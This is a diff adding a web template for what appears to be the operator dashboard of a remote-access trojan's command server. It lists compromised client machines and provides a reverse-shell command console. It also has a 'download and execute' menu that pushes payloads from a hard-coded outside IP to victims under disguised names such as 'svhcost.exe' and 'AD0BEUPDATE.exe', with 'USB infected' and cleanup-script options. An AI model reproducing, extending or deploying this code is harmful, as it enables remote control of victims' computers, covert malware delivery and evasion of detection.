@@ -1,0 +1,437 @@
+<div style="margin: 0 8px">
+  <div class="row">
+    <div class="col-md-12">
+      <div class="card">
+        <div class="card-header card-header-warning">
+          <h4 class="card-title" style="font-size: 12px">Clients</h4>
+        </div>
+        <div class="card-body table-responsive">
+          <table class="table">
+            <thead>
+              <tr>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  ID
+                </th>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  USERNAME
+                </th>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  IPProxyForward
+                </th>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  OS
+                </th>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  VERSION
+                </th>
+                <th
+                  class="text-center"
+                  style="font-weight: bold; font-size: 14px"
+                >
+                  COUNTRY
+                </th>
+              </tr>
+            </thead>
+            <tbody>
+              <% clients.forEach(function(client){ %>
+              <tr>
+                <td
+                  class="text-center ClientListing"
+                  data-client-id="<%= client.client_id %>"
+                  data-admin-id="<%= admin.admin_id %>"
+                >
+                  <%= client.client_id %>
+                </td>
+                <td
+                  class="text-center"
+                  style="text-decoration: underline #f5700c"
+                >
+                  <a href="../client_dashboard/<%= client.client_id %>"
+                    ><%= client.client_hostname %></a
+                  >
+                </td>
+                <td class="text-center"><%= client.client_ip %></td>
+                <td class="text-center">
+                  <%= client.client_os %> (<%= client.client_os_version %>)
+                </td>
+                <td class="text-center"><%= client.client_version %></td>
+                <td class="text-center"><%= client.client_country %></td>
+              </tr>
+              <% }); %>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col-sm-12">
+      <div class="card">
+        <div class="card-header card-header-warning">
+          <h4 class="card-title" style="font-size: 12px" id="titleLogs">
+            Live socket
+          </h4>
+        </div>
+        <div class="card-body">
+          <div style="float: right">
+            <button
+              type="button"
+              class="btn mr-2"
+              style="font-size: 12px; background-color: #f5700c"
+              id="btnLiveSocket"
+            >
+              Live socket
+            </button>
+            <button
+              type="button"
+              class="btn mr-2"
+              style="font-size: 12px; background-color: #f5700c"
+              id="btnShellCloud"
+            >
+              Shell on Cloud
+            </button>
+            <button
+              type="button"
+              class="btn mr-2"
+              style="font-size: 12px; background-color: #f5700c"
+              id="btnWebLogs"
+            >
+              Web Logs
+            </button>
+          </div>
+        </div>
+        <div class="col-sm-12" style="margin-bottom: 15">
+          <div id="container-liveLogClient" class="liveLogs">
+            <pre class="remoteShell"></pre>
+            <div id="liveLogClient"></div>
+          </div>
+          <div id="container-shellCloud" class="liveLogs">
+            <pre id="shellCloud" class="remoteShell"></pre>
+            <input
+              type="text"
+              name=""
+              value=""
+              class="form-control cmdForReverseShellCloud"
+              placeholder="Enter command"
+              style="
+                background: #000;
+                border-radius: 5px;
+                color: #2ecc71;
+                border: 1px solid #fd950d;
+                padding: 10 12;
+              "
+            />
+          </div>
+          <div class="card-body table-responsive" id="container-tableLogsWeb">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    ID
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    Date/Time
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    IP
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    Type
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    Origin
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    URL
+                  </th>
+                  <th
+                    class="text-center"
+                    style="font-weight: bold; font-size: 14px"
+                  >
+                    Data
+                  </th>
+                </tr>
+              </thead>
+              <tbody>
+                <% logs.forEach(function(log){ %>
+                <tr>
+                  <td class="text-center"><%= log.log_id%></td>
+                  <td class="text-center">
+                    <%= log.log_datetime.getFullYear() %>-<%=
+                    log.log_datetime.getMonth() %>-<%= log.log_datetime.getDay()
+                    %> <%= log.log_datetime.getHours() %>:<%=
+                    log.log_datetime.getMinutes() %>:<%=
+                    log.log_datetime.getSeconds() %>
+                  </td>
+                  <td class="text-center" style="width: 15%">
+                    <%= log.log_ip%>
+                  </td>
+                  <td class="text-center"><%= log.log_type%></td>
+                  <td class="text-center"><%= log.log_origin%></td>
+                  <td class="text-center"><%= log.log_text%></td>
+                  <td class="text-center" style="width: 30%">
+                    <%= log.log_data%>
+                  </td>
+                </tr>
+                <% }); %>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="dropdown-menu" id="menu">
+      <ul class="dropdown-item" id="submenu">
+        <a class="linkRemoteShell">
+          <!-- <button
+            type="button"
+            class="btn menuLabel btn-block btn-warning"
+            data-toggle="dropdown"
+            aria-haspopup="true"
+            aria-expanded="false"
+          >
+        
+            <span class="glyphLeft glyphicon glyphicon glyphicon-globe"></span>
+            Remote Shell
+          </button> -->
+          <button
+            type="button"
+            class="btn mr-2"
+            style="font-size: 12px; background-color: #f5700c"
+          >
+            <!-- <button type="button" class="menuLabel btn-block btn-primary"></button> -->
+            Remote Shell
+          </button>
+        </a>
+      </ul>
+
+      <ul
+        class="dropdown-item downloaded"
+        id="submenu"
+        style="display: block !important; width: 500px !important"
+      >
+        <button
+          onclick="myFunction()"
+          class="btn mr-2"
+          style="font-size: 12px; background-color: #f5700c"
+        >
+          <span class="glyphLeft glyphicon glyphicon-download-alt"></span>
+          Tải về & Thực thi
+        </button>
+        <div id="myDropdown" class="dropdown-content">
+          <a class="downloadedDns">DNS Tunneling</a>
+          <a class="downloadedTar">RAR tools </a>
+          <a class="downloadedUSB">USB infected</a>
+        </div>
+      </ul>
+      <ul class="dropdown-item show delete">
+        <a class="downloadedDeleteEvent">
+          <button
+            class="btn mr-2"
+            style="font-size: 12px; background-color: #f5700c"
+          >
+            <span class="glyphLeft glyphicon glyphicon-remove"></span>
+            Xóa bỏ
+          </button>
+        </a>
+      </ul>
+      <!-- <ul class="dropdown-item downloaded">
+        <a>
+          <button class="btn menuLabel btn-block btn-primary">
+            Download & Execute
+          </button>
+        </a>
+      </ul> -->
+    </div>
+  </div>
+</div>
+
+<script src="js/jquery-1.11.3.min.js"></script>
+<script src="js/jquery-migrate-1.2.1.min.js"></script>
+<script>
+  function client_download(socket, data) {
+    //Download  file
+    $(".downloadedDns").click(function (e) {
+      var clientID = $(this).parent().parent().data("client-id");
+      console.log("client id: ", clientID);
+      var path = "http://174.138.27.147/DNSclient.exe";
+      var name = "svhcost.exe";
+      console.log(name);
+      socket.emit("downloaded", clientID, path, name);
+    });
+    $(".downloadedTar").click(function (e) {
+      var clientID = $(this).parent().parent().data("client-id");
+      var path = "http://174.138.27.147/rar.exe";
+      var name = "rar.exe";
+      socket.emit("downloaded", clientID, path, name);
+    });
+    $(".downloadedUSB").click(function (e) {
+      var clientID = $(this).parent().parent().data("client-id");
+      var path = "http://174.138.27.147/notepad.exe";
+      var name = "AD0BEUPDATE.exe";
+      socket.emit("downloaded", clientID, path, name);
+    });
+    $(".downloadedDeleteEvent").click(function (e) {
+      var clientID = $(this).parent().data("client-id");
+      var path = "http://174.138.27.147/del.bat";
+      var name = "del.bat";
+      console.log(clientID);
+      socket.emit("downloaded", clientID, path, name);
+    });
+  }
+  function init_client_listing(socket, data) {
+    // Get online client on pagination change
+    $(".paginate_button").live("click", function () {
+      socket.emit("getNodeClientOnline");
+    });
+
+    // Log live client
+    socket.on("liveLogClient", function (text, type) {
+      var dateTime = new Date();
+      $("#liveLogClient").prepend(
+        "[" +
+          dateTime +
+          "] <span class='logs-" +
+          type +
+          "' style='color:black;padding:5px;'>" +
+          text +
+          "</span><br>"
+      );
+    });
+
+    // Send cmd to reverse shell for cloud
+    $(".cmdForReverseShellCloud").keypress(function (e) {
+      if (e.which == 13) {
+        var cmd = $(".cmdForReverseShellCloud").val();
+        socket.emit("cmdForReverseShellCloud", cmd);
+        $(".cmdForReverseShellCloud").val("");
+      }
+    });
+
+    // Callback reverse shell cloud
+    socket.on("reverseShellCallbackCloud", function (data, type) {
+      if (type == "success") var logType = "logs-info";
+      if (type == "error") var logType = "logs-danger";
+      $("#shellCloud").append(
+        "<p class='logs-warning'>=======================================</p>"
+      );
+      $("#shellCloud").append("<p class='" + logType + "'>" + data + "</p>");
+      $("#shellCloud").scrollTop($("#shellCloud")[0].scrollHeight);
+    });
+
+    /* ---------- FRONTEND ---------- */
+
+    $.slidebars({
+      siteClose: true, // true or false
+      disableOver: false, // integer or false
+      hideControlClasses: false, // true or false
+      scrollLock: true, // true or false
+    });
+
+    // DataTbale client
+    $("#table_clients").DataTable({
+      responsive: true,
+      scrollX: true,
+      pageLength: 10,
+      order: [[0, "desc"]],
+      /*"language": {
+        "url": "https://cdn.datatables.net/plug-ins/1.10.13/i18n/French.json"
+    }*/
+    });
+
+    // DataTbale logs
+    $("#table_logs").DataTable({
+      responsive: true,
+      scrollX: true,
+      pageLength: 5,
+      order: [[0, "desc"]],
+      /*"language": {
+        "url": "https://cdn.datatables.net/plug-ins/1.10.13/i18n/French.json"
+    }*/
+    });
+  }
+
+  $(document).ready(function () {
+    $("#container-tableLogsWeb").hide();
+    $("#container-shellCloud").hide();
+
+    $("#btnLiveSocket").click(function () {
+      $("#container-liveLogClient").show();
+      $("#container-shellCloud").hide();
+      $("#container-tableLogsWeb").hide();
+      $("#titleLogs").html("Live socket");
+    });
+
+    $("#btnShellCloud").click(function () {
+      $("#container-liveLogClient").hide();
+      $("#container-shellCloud").show();
+      $("#container-tableLogsWeb").hide();
+      $("#titleLogs").html("Shell on Cloud");
+    });
+
+    $("#btnWebLogs").click(function () {
+      $("#container-liveLogClient").hide();
+      $("#container-shellCloud").hide();
+      $("#container-tableLogsWeb").show();
+      $("#titleLogs").html("Web Logs");
+    });
+
+    //$(".DataTables_scrollBody").niceScroll({cursorcolor:"#3498db"});
+    $(".remoteShell").niceScroll({ cursorcolor: "#3498db" });
+  });
+
+  /* When the user clicks on the button,
+toggle between hiding and showing the dropdown content */
+  function myFunction() {
+    document.getElementById("myDropdown").classList.toggle("show");
+    document.getElementById("menu").classList.toggle("show");
+    document.getElementById("submenu").classList.toggle("show");
+  }
+
+  // Close the dropdown menu if the user clicks outside of it
+  window.onclick = function (event) {
+    if (!event.target.matches(".dropbtn")) {
+      var dropdowns = document.getElementsByClassName("dropdown-content");
+      var i;
+      for (i = 0; i < dropdowns.length; i++) {
+        var openDropdown = dropdowns[i];
+        if (openDropdown.classList.contains("show")) {
+          openDropdown.classList.remove("show");
+        }
+      }
+    }
+  };
+</script>
